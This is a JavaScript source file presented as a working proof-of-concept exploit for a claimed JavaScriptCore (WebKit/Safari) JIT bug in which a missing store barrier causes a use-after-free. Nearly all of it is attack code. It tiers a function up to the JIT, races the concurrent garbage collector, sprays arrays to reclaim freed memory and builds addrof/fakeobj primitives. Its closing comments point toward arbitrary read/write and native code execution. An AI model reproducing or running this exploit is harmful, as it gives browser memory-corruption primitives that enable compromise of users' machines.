/*
 * CVE-2025-43529 — full working PoC
 * ==================================
 * JavaScriptCore (WebKit) DFG JIT bug in StoreBarrierInsertionPhase.
 *
 * Bug (matches writeup.txt):
 *   The phase marks the *Phi* node as GC-escaping when its value flows into an
 *   old-space store (`A.p1 = f`), but it fails to mark the Phi's transitively
 *   incoming values (the Upsilon inputs, i.e. `b`) as escaping. The store
 *   `b.p0 = a` therefore compiles WITHOUT the StoreBarrier(b):
 *
 *       BB#1   a: NewObject(NewSpace)          <- victim, freed by the GC
 *              b: NewObject(NewSpace)          <- escapes, but compiler thinks it doesn't
 *              c: Upsilon(@b, ^f)
 *              Branch(BB#2, BB#3)
 *       BB#2   ... d: (double)   e: Upsilon(@d, ^f)   Jump(BB#3)
 *       BB#3   f: Phi(@c, @e)
 *              A.p1 = f       -> PutByOffset(@A, @f): StoreBarrier(A) IS emitted
 *                                A(black) -> f/b(white) edge is reported...
 *              b.p0 = a       -> PutByOffset(@b, @a): StoreBarrier(b) OMITTED (buggy)
 *                                => Black(b) -> White(a) edge is invisible to GC
 *
 *   Consequence: during concurrent/incremental marking the marker walks A -> f -> b,
 *   marks b black *before* the mutator executes `b.p0 = a`. Because no write barrier
 *   is emitted, b is not re-greyed, the marker never observes the slot, `a` stays
 *   white and is swept -> use-after-free on `a` (reachable afterwards via A.p1.p0).
 *
 * This PoC wins the main-thread vs marker-thread race and converts the UAF into
 * the classic addrof / fakeobj primitives:
 *
 *   1. park an old-space `A` behind a 4M-slot array so the marker is busy when we mutate
 *   2. allocate big ArrayBuffers through A to force a full (old-space) GC cycle
 *   3. spin-loop so the marker finishes scanning `b` right before `b.p0 = a` executes
 *   4. deep recursion to scrub stale butterfly pointers off the stack (conservative scan)
 *   5. re-claim the freed butterfly with `[13.37, 2.2, 3.3, 4.4, 13.37]` array sprays
 *   6. dual-view the shared butterfly: Contiguous (write object) / NonArrayWithDouble
 *      (read raw bits) => addrof / fakeobj
 *
 * Run:   jsc --useConcurrentGC=true poc.js        (see run.sh)
 * Fix:   WebKit commit b21a503 (bug 302502) — DFGStoreBarrierInsertionPhase.cpp now
 *        marks "all transitively incoming values to phi".
 *
 * Expected output on a vulnerable build (e.g. Safari 26.0.x / 26.1, WebKit rev.
 * <= 304601): the reclaimed-butterfly line plus a leaked tagged pointer.
 * On a patched build the loop simply exhausts and exits cleanly.
 */

"use strict";

// ---------------------------------------------------------------------------
// Tunables (machine dependent — the race is timing sensitive)
// ---------------------------------------------------------------------------
const CFG = {
    // `A` is parked at the last slot of a 4M-entry old-space array: the marker
    // must walk 4M slots before it can observe A => timing window while it scans.
    SCAN_DELAY_LEN: 0x400000,

    // 8 MiB ArrayBuffers, referenced from A, to push the heap into a full GC
    // cycle in which A gets scanned.
    GC_TARGET_SIZE: 0x800000,

    // Busy-loop knobs used to land the marker's scan of `b` right before `b.p0 = a`.
    SPIN_OUTER: 1e6 | 0,     // outer iterations of the timing loop
    SPIN_INNER_MIN: 8,       // inner iterations (jittered per attempt)
    SPIN_INNER_MAX: 12,

    ALLOC_MIN: 1,            // ArrayBuffers per attempt (forces the GC)
    ALLOC_MAX: 4,

    WARMUP: 2000,            // calls to tier jitme up to DFG/FTL (both Phi arms)
    ATTEMPTS: 10000,         // racing attempts before giving up
    STACK_SCRUB_DEPTH: 10000,// deep recursion overwrites stale butterfly pointers
    RECLAIM_ROUNDS: 16,      // array sprays per attempt
    PROGRESS_EVERY: 100,
};

// ---------------------------------------------------------------------------
// Logging that works under the jsc shell, the Safari console and node
// ---------------------------------------------------------------------------
const log = (typeof print === "function" && typeof window === "undefined")
    ? (s) => print(s)
    : (s) => console.log(s);

// ---------------------------------------------------------------------------
// Runtime layout: old-space "parking lot" for the escape-holder A
// ---------------------------------------------------------------------------
const scan_delay = new Array(CFG.SCAN_DELAY_LEN).fill(1.1);
const scan_delay_index = scan_delay.length - 1;
const reclaimed = [];       // keeps sprayed arrays (and their butterflies) alive

// ---------------------------------------------------------------------------
// The vulnerable function (structure mirrors the patch-commit IR above)
// ---------------------------------------------------------------------------
function jitme(flag, spinOuter, spinInner, allocCount) {
    // BB#1 — A escapes into old space; a and b are the new-space objects.
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    scan_delay[scan_delay_index] = A;

    let a = new Date(1111);  // victim: UAF'd, and it owns a separate butterfly
    a[0] = 1.1;              // -> NonArrayWithDouble, a 1-slot double butterfly
    let b = { p0: 0x42424242 };

    // Force the marker into a full old-space cycle: big ArrayBuffers kept alive
    // through A so the allocation can't be optimized away.
    let forGC = [];
    for (let j = 0; j < allocCount; ++j) {
        let buf = new ArrayBuffer(CFG.GC_TARGET_SIZE);
        forGC.push(buf);
    }
    A.p2 = forGC;

    // BB#2 / BB#3 — Upsilon(@b, ^f) or Upsilon(@1.1, ^f); the Phi is created in BB#4.
    let f;
    if (flag) {
        f = b;      // Upsilon(f, ^b): VSS(Phi(f)) = b   <- the interesting arm
    } else {
        f = 1.1;    // Upsilon(f, ^1.1): non-cell, irrelevant for StoreBarrier
    }

    // BB#4
    A.p1 = f;      // PutByOffset(@A, @f): StoreBarrier(A) IS emitted (correct).
                   // The Phi is (correctly) treated as GC-escaping here, but the
                   // buggy phase does not propagate that escaping transitively
                   // back to the Upsilon input @b.

    // Timing loop: keeps the mutator busy so the marker thread finishes its scan
    // of b right before the barrier-less store below executes.
    let v = 1.1;
    for (let i = 0; i < spinOuter; ++i) {
        for (let j = 0; j < spinInner; ++j) {
            v = i;
            v = j;
        }
    }
    A.p2 = v;      // result flows into an escaped store: the loop is not dead code

    b.p0 = a;      // PutByOffset(@b, @a): StoreBarrier(b) OMITTED by the DFG bug.
                   // => Black(b) -> White(a) is invisible to the concurrent marker:
                   //    a stays white and gets swept while still reachable.
}

// ---------------------------------------------------------------------------
// Stack hygiene: overwrite stale butterfly pointers left behind by previous
// calls so the GC's conservative stack scan cannot resurrect `a`.
// ---------------------------------------------------------------------------
function scrub_stack(depth) {
    if (depth === 0) return;
    depth = depth | 0;
    scrub_stack(depth - 1);
}

// ---------------------------------------------------------------------------
// One racing attempt. Returns { freed, thief } on reclaim, otherwise null.
// ---------------------------------------------------------------------------
function attempt(n) {
    const spinInner = CFG.SPIN_INNER_MIN
        + (n % (CFG.SPIN_INNER_MAX - CFG.SPIN_INNER_MIN + 1));
    const allocCount = CFG.ALLOC_MIN + (n % (CFG.ALLOC_MAX - CFG.ALLOC_MIN + 1));

    jitme(true, CFG.SPIN_OUTER, spinInner, allocCount);

    // Drop the stale butterfly pointer the JITed code left in this frame's slot,
    // then nudge a few collections so sweeps actually rebuild the free lists.
    scrub_stack(CFG.STACK_SCRUB_DEPTH);
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);

    const bRef = scan_delay[scan_delay_index].p1;  // A.p1 === f === b
    const freed = bRef.p0;                         // b.p0 === a (already swept?)

    // Re-claim: spray 5-element double arrays; if one lands on a's butterfly,
    // reading a[0] through the dangling double view yields the first element.
    const noCow = 13.37;
    let thief = null;
    for (let i = 0; i < CFG.RECLAIM_ROUNDS; ++i) {
        let arr = [13.37, 2.2, 3.3, 4.4, noCow];
        reclaimed.push(arr);
        if (freed[0] === 13.37) {
            thief = arr;
            break;
        }
    }
    if (thief === null) return null;
    return { freed: freed, thief: thief };
}

// ---------------------------------------------------------------------------
// addrof / fakeobj from the shared butterfly.
//   boxed   -> the sprayed JSArray (Contiguous after boxed[0] = {})
//   unboxed -> the freed Date (NonArrayWithDouble view of the same butterfly)
// ---------------------------------------------------------------------------
function make_primitives(hit) {
    const boxed = hit.thief;
    const unboxed = hit.freed;
    boxed[0] = {};               // boxed array: Double -> Contiguous (pointer view)

    const ab = new ArrayBuffer(8);
    const u64 = new BigUint64Array(ab);
    const f64 = new Float64Array(ab);
    const itof = (u) => { u64[0] = u; return f64[0]; };
    const ftoi = (f) => { f64[0] = f; return u64[0]; };

    return {
        addrof: (obj) => { boxed[0] = obj; return ftoi(unboxed[0]); },
        fakeobj: (addr) => { unboxed[0] = itof(addr); return boxed[0]; },
    };
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
function main() {
    log("[*] CVE-2025-43529: DFG StoreBarrierInsertionPhase UAF on a via b.p0 = a");

    // 1. Tier jitme up to the DFG/FTL with both Phi arms profiled.
    jitme(true, 0, 0, 0);
    jitme(false, 0, 0, 0);
    for (let i = 0; i < CFG.WARMUP; ++i)
        jitme((i % 2) === 1, 0, 0, 0);
    log("[*] warmup complete (" + CFG.WARMUP + " calls, both Phi arms)");

    // 2. Scrub stale butterfly pointers off the stack before we start racing.
    for (let i = 0; i < 3; ++i) scrub_stack(CFG.STACK_SCRUB_DEPTH);

    // 3. Win the race.
    for (let n = 0; n < CFG.ATTEMPTS; ++n) {
        let hit = attempt(n);
        if (hit === null) {
            if (n % CFG.PROGRESS_EVERY === 0)
                log("[*] attempt " + n + ": no reclaim yet, retrying");
            continue;
        }

        log("[+] attempt " + n + ": freed butterfly reclaimed — UAF confirmed");

        const prims = make_primitives(hit);
        const probe = { p0: 1.1 };
        const addr = prims.addrof(probe);
        log("[+] addrof({p0:1.1}) = 0x" + addr.toString(16));

        const back = prims.fakeobj(addr);
        log(back === probe
            ? "[+] fakeobj round-trip OK — addrof/fakeobj primitives established"
            : "[-] fakeobj round-trip mismatch");

        log("[*] From here: standard JSC exploitation (arbitrary R/W via a forged");
        log("    JSArray/JSCell, then native-exec e.g. via WASM RWX — left as an exercise.");
        return true;
    }

    log("[-] race not won in " + CFG.ATTEMPTS + " attempts.");
    log("    Try: raise SPIN_OUTER / ATTEMPTS, or run on a vulnerable Safari build.");
    return false;
}

if (!main() && typeof quit === "function")
    quit(1);
